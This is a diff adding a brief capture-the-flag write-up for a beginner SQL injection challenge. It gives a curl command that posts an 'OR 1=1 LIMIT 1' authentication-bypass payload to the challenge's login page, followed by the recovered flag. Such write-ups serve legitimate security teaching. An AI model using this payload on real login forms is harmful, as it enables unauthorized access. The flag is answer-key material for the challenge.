@@ -1,0 +1,9 @@
+This is a simple SQL injection where you have to get exactly one row to return from the query.
+
+In this case, we can just use the SQL Injection example given on Wikipedia and limit the results to only one row.
+
+http://en.wikipedia.org/wiki/SQL_injection#Technical_implementations
+
+curl -d "username=' OR 1=1 LIMIT 1 -- '" http://stuyctf.me/php/SIMPLE-SQL-INJECTION/login.php
+
+stuyctf{sql_injections_are_fun_but_also_the_biggest_web_problem}
